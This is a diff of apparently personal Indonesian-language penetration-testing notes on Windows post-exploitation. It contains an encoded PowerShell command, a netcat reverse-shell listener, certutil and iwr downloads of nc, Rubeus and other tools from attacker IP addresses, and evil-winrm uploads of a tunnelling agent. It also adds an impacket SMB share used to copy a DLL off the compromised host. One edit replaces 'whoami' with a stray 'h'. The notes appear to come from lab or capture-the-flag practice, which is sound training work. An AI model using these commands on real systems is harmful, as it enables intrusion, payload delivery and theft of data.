@@ -16,6 +16,10 @@ powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIAAiACQAYwBsAGkA
 rlwrap nc -lvnp 4444
 ```
 ![](Attachments/Pasted%20image%2020260629092222.png)
+## c. Sent nc
+```powershell
+iwr -uri http://10.10.15.236:8088/nc_64_bits.exe -OutFile nc_64_bits.exe
+```
 # 1. User.txt
 ## Cari User di directory lain
 ```powershell
@@ -39,7 +43,7 @@ $env:PROCESSOR_ARCHITECTURE
 ![](Attachments/Pasted%20image%2020260824130947.png)
 ## b. Siapa saya?
 ```powershell
-whoami
+h
 whoami /priv #dahulukan ini
 whoami /group
 systeminfo
@@ -96,6 +100,7 @@ $s = New-Object -ComObject "Schedule.Service"; $s.Connect(); $s.GetFolder("\").G
 download "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
 ```
 ## b. Upload
+### i. Dari evil-winrm
 ```powershell
 upload '/home/kali/forensic-tools/volatility3-win-exes-2.28.0/vol.exe' 'C:\Windows\Temp\vol.exe'
 
@@ -104,7 +109,7 @@ upload '/home/kali/ligolo/ligolo-agent.exe' 'C:\Windows\Temp\ligolo-agent.exe'
 # Verify
 ls C:\Windows\Temp\vol.exe
 ```
-dari web server
+### ii. Dari RCE
 ```shell
 # Attacker machine
 python3 -m http.server 8088
@@ -119,6 +124,17 @@ certutil -urlcache -split -f http://10.10.14.38:8088/Rubeus.exe Rubeus.exe
 iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip
 
 ```
+## c. Sent data from RCE shell
+```powershell
+# set smb file di kali
+sudo impacket-smbserver share . -smb2support -username test -password test
+
+# kirim dari windows
+net use \\10.10.15.236\share /user:test test
+copy SmarterMail.Standard.dll \\10.10.15.236\share\
+```
+![](Attachments/Pasted%20image%2020260901142257.png)
+![](Attachments/Pasted%20image%2020260901142402.png)
 # 5. Powershell
 ## a. Menjalankan powershell tanpa restriction
 ```
